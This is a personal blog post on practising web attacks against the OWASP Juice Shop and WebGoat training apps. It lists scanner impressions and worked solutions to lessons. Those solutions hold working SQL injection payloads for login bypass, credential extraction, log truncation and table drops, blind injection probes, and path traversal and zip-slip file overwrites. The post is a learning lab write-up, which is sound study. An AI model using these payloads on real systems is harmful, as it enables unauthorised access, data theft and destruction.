---
title: juice and goats
slug: juice-and-goats
date: 2023-05-26
categories:
  - SQL Injection
  - Web App Pen Testing
---

  [OWASP Juice Shop]: https://owasp.org/www-project-juice-shop/
  [Ubuntu VM]: ./it-hums-it-roars.md
  [Juice Shop Github]: https://github.com/juice-shop/juice-shop#from-sources
  [Wapiti]: https://wapiti-scanner.github.io/
  [Skipfish]: https://www.kali.org/tools/skipfish/
  [BurpSuite]: https://portswigger.net/burp/communitydownload
  [nikto]: https://github.com/sullo/nikto
  [OWASP WebGoat]: https://owasp.org/www-project-webgoat/
  [WebGoat Github]: https://github.com/WebGoat/WebGoat/releases

# Juice shops and web goats

For those who don't know, the [OWASP Juice Shop]{target=_blank} is a ~~handy~~ **modern full stack web app** with some of the top known vulnerabilities baked in, thus allowing you to get your web pen testing juices flowing (pun intended)!

I set up a local [Ubuntu VM] and installed the Juice Shop manually using NodeJS and NPM.

<!-- more -->

!!! info "Using NPM"
    Go to the [Juice Shop Github]{target=_blank} for the full installation instructions.
    Here is the what I did (need NodeJS & NPM installed)
    ```` bash
    git clone https://github.com/juice-shop/juice-shop.git --depth 1
    cd juice-shop
    npm install
    npm start
    ````

After getting the Juice Shop server set up, I set up an additional VM with Kali Linux and then provided them both with only a single network interface, a local link, to talk to each other.

!!! warning
    It's not a good idea to set up the Juice Shop and provide access to the WWW to the server...

On the Kali box, I tried the following security scanning apps to get an general idea of possible exploits.

### Scanning the Juice Store

- [Wapiti]{target=_blank}: Found nothing
- [SkipFish]{target=_blank}: Decent amount of hidden directories and more. Nice HTML report. Crashed web server. Found redirect flag for Juice Store.
- [BurpSuite]{target=_blank}: Have to request a trial for 30 days (don't want to pay $500 for pro in order to scan). Still waiting on trial.
- [nikto]{target=_blank}: Very heavy on the certificates found in various paths. Need to check if output a nicer report format. Found WordPress directories that others missed.

### SQL Injection

I find most information on the internet about SQL Injection sorely lacking. It's quite interesting to me that this same example for SQL Injection has been around for a very long time, if I'm not mistaken.

```
' or 1=1;--
```

Does this still work on a bunch of servers? I wonder.

Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:

User:

```
administrator\' or 1=1;--
```

Pass: test

Which logged me in and provided me with the real admin email: admin@juice-sh.op

### OWASP WebGoat

WebGoat is one of the best free instructional units for various types of web vulnerabilities that I have come across. The entire app is packaged as a single .jar and is super simple to get running. There are 8 lessons broken down by the types of vulnerabilities you would see in the wild and many of the lessons have several sections each. WebGoat is great for learning!

!!! info "Download and installation instructions"
    [OWASP WebGoat]{target=_blanks} main page  
    You can find the latest .jar distribution files at the [WebGoat Github]{target=_blank} page.

I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can change the server address using the following command line argument:

```java
java -jar webgoat-app.jar --server.address=0.0.0.0
```

And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.

This is what finally worked for me (which I gleaned from the [github repo](https://github.com/WebGoat/WebGoat)):

````java
java -Dserver.address=0.0.0.0 -jar webgoat-app.jar
````

??? info "FYI WebGoat uses HSQLDB"
    Some interesting functions for HSQLDB:
    ````
    char()
    length()
    substr()
    ````
    More can be found in [the reference]{target=_blank} and more specifically the [system functions].
  [system functions]: https://hsqldb.org/doc/2.0/guide/guide.html#builtinfunctions-chapt
  [the reference]: https://hsqldb.org/doc/2.0/guide/guide.html#sqlgeneral-chapt

Some good tips picked up from the lessons in WebGoat:

- ' or 1=1; TRUNCATE audit_log;--
- ' or '1'='1
- SQL Injection is more common in PHP, ASP and ColdFusion
- SQL server exploits can lead to a command shell
- String concatenation with ' or + or ||
- Strings without quotes: char(27)
- SELECT * FROM users WHERE name = '+char(27) OR 1=1
- use prepared statements help mitigate SQL Injection
- implement whitelist with ORDER BY
- Use zip files to overwrite files after upload using path traversal

### Blind SQL Injection

- Involves asking 'database true or false questions' when server provides only generic error responses.
- Types include: content-based and time-based injections
- Find out what type of DB as that can provide insight to available system tables

````yaml title="Content-based"
    https://shop.example.com/?article=4 and 1=1 # (1)!
````

1.  If no error is thrown, then this DB might be susceptible to SQL Injection

````javascript title="Time-based"
    ' or 1=1; sleep(10);-- // (1)!
````

1.  If there is 10 second delay then this DB might be susceptible

---

## Solutions Intro
---

### WebGoat SQL (Intro) - Solution for exercise 9:

A classic??

````
' or '1'='1
````

### WebGoat SQL (Intro) - Solution for exercise 10:

````title="Login_Count:"
1
````
````yaml title="User_id:"
1 or 1=1 # (1)!
````

1.  These fields expect numbers and therefore no quotes are necessary.

### WebGoat SQL (Intro) - Solution for exercise 11:

````title="Employee Name:"
' or 1=1;--
````

or

````title="Employee Name:"
Blah
````
````title="Authentication TAN:"
' or '1'='1
````

### WebGoat SQL (Intro) - Solution for exercise 12:

````title="Employee Name:"
' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'
````

### WebGoat SQL (Intro) - Solution for exercise 13:

````title="Action contains:"
' or 1=1; DROP TABLE access_log;--
````

---

## Solutions Advanced -- Where things get interesting
---

### WebGoat SQL (Advanced) - Solution for exercise 3:

````title="Name:"
Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--
````

or

````title="Name:"
Dave'; select * from user_system_data;--
````

### WebGoat SQL (Advanced) - Solution for exercise 5:

This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:

````title="Username:"
devon' and 1=1;--
````

The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.

Also, you can double check that injection is possible by using the reverse logic:

````title="Username:"
devon' and 1=2;--
````

Using this entry, one can create the same user over and over without being warned that the user already exists. This again indicates that the server is using the injection. Devon exists so the left side of AND is TRUE and as 1=2 is FALSE, the boolean logic becomes:

true AND false = false

---

## Solutions Mitigation
---

### WebGoat  SQL (Mitigation) - Solution for exercise 9:

Here the backend server is removing all spaces. In order to bypass this, we can use multiline comments to replace the spaces:

````title="Replace spaces with comments"
'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--
````

---

## Solutions Path Traversal
---

### WebGoat  SQL (Path Traversal) - Solution for exercise 3:

Here the app is replacing occurrences of "../" to prevent "dot-dot-slash" or path traversal. In the following example, the middle is replaced by the app leaving the path traversal nonetheless:

````title="Full Name:"
....//test
````

### WebGoat  SQL (Path Traversal) - Solution for exercise 4:

- Open *Manual Request Editor* using OWASP ZAP.   
- In the request body change:
````
filename="../white-bookshelf.jpg"
````

### WebGoat  SQL (Path Traversal) - Solution for exercise 5:

Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the *Manual Request Editor*. Found the location by first adding just `%2e%2e%2f` to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.

````title="GET Request"
GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret
````

### WebGoat  SQL (Path Traversal) - Solution for exercise 7:

````bash title="Terminal"
cd /tmp/webgoat125something
cp /location-of-some/pic.jpg /home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
zip goat.zip ../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
````

Then, upload the file via the WebGoat upload page.

### Interesting SQL Injection queries I used to get necessary info from the DB:

````title="Using EXISTS()"
' or EXISTS(SELECT * FROM users);
devon' and exists(select * from users) and '1'='1
````
````title="Using Binary Search"
Tom' and length(password)>0;--
tom' AND ascii(substring(password,1,1)) > 60;--
Tom' and length(user)>5;--
Tom' and ascii(substr(user,2,2))=65;--
Tom' and right(email,3)='com
````
